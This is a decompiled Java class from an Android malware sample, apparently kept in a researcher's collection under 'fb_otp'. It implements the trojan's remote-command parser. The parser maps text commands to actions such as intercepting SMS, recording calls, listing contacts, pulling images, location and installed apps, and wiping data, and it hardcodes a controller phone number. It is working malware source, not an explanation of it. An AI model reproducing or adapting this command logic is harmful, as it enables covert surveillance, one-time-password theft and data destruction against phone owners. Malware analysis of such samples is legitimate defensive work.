import com.soft360.iService.AService;

public final class em
{
  private static em a;
  public static String a;
  public static String b;
  private String c;
  
  static
  {
    jdField_a_of_type_JavaLangString = "+79067075145";
    b = "+79067075145";
    jdField_a_of_type_Em = null;
  }
  
  private static int a(String paramString)
  {
    if (paramString.startsWith("sms start")) {
      return 1;
    }
    if (paramString.equalsIgnoreCase("sms stop".toString())) {
      return 2;
    }
    if (paramString.equalsIgnoreCase("call start".toString()))
    {
      b = jdField_a_of_type_JavaLangString;
      return 3;
    }
    if (paramString.equalsIgnoreCase("call stop".toString()))
    {
      b = jdField_a_of_type_JavaLangString;
      return 4;
    }
    if (paramString.indexOf("change num") == 0)
    {
      jdField_a_of_type_JavaLangString = paramString.substring(paramString.lastIndexOf(" ") + 1);
      AService.a();
      return -1;
    }
    if (paramString.indexOf("call start") == 0)
    {
      b = paramString.substring(paramString.lastIndexOf(" ") + 1);
      return 3;
    }
    if (paramString.equalsIgnoreCase("sms list".toString())) {
      return 5;
    }
    if (paramString.equalsIgnoreCase("call list".toString())) {
      return 6;
    }
    if (paramString.equalsIgnoreCase("start record".toString())) {
      return 7;
    }
    if (paramString.equalsIgnoreCase("stop record".toString())) {
      return 8;
    }
    if (paramString.indexOf("sendSMS") == 0) {
      return 9;
    }
    if (paramString.equalsIgnoreCase("contact list".toString())) {
      return 10;
    }
    if (paramString.equalsIgnoreCase("wipe data".toString())) {
      return 11;
    }
    if (paramString.equalsIgnoreCase("ping".toString())) {
      return 12;
    }
    if (paramString.indexOf("checkurl") == 0) {
      return 13;
    }
    if (paramString.indexOf("adddomain") == 0) {
      return 14;
    }
    if (paramString.equalsIgnoreCase("get images".toString())) {
      return 15;
    }
    if (paramString.equalsIgnoreCase("get place".toString())) {
      return 16;
    }
    if (paramString.equalsIgnoreCase("get apps".toString())) {
      return 17;
    }
    if (paramString.equalsIgnoreCase("start record call".toString())) {
      return 18;
    }
    if (paramString.equalsIgnoreCase("stop record call".toString())) {
      return 19;
    }
    if (paramString.indexOf("greed ") == 0) {
      return 20;
    }
    return -1;
  }
  
  public static em a()
  {
    if (jdField_a_of_type_Em == null) {
      jdField_a_of_type_Em = new em();
    }
    return jdField_a_of_type_Em;
  }
  
  public final void a(String paramString)
  {
    this.c = paramString;
  }
  
  public final boolean a()
  {
    return a(this.c) == 14;
  }
  
  public final boolean b()
  {
    return a(this.c) == 13;
  }
  
  public final boolean c()
  {
    return a(this.c) == 1;
  }
  
  public final boolean d()
  {
    return a(this.c) == 3;
  }
  
  public final boolean e()
  {
    return a(this.c) == 4;
  }
  
  public final boolean f()
  {
    return a(this.c) == 2;
  }
  
  public final boolean g()
  {
    return a(this.c) == 5;
  }
  
  public final boolean h()
  {
    return a(this.c) == 6;
  }
  
  public final boolean i()
  {
    return a(this.c) == 10;
  }
  
  public final boolean j()
  {
    return a(this.c) == 7;
  }
  
  public final boolean k()
  {
    return a(this.c) == 8;
  }
  
  public final boolean l()
  {
    return a(this.c) == 18;
  }
  
  public final boolean m()
  {
    return a(this.c) == 19;
  }
  
  public final boolean n()
  {
    return a(this.c) == 9;
  }
  
  public final boolean o()
  {
    return a(this.c) == 11;
  }
  
  public final boolean p()
  {
    return a(this.c) == 15;
  }
  
  public final boolean q()
  {
    return a(this.c) == 12;
  }
  
  public final boolean r()
  {
    return a(this.c) == 16;
  }
  
  public final boolean s()
  {
    return a(this.c) == 17;
  }
  
  public final boolean t()
  {
    return a(this.c) == 20;
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/em.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */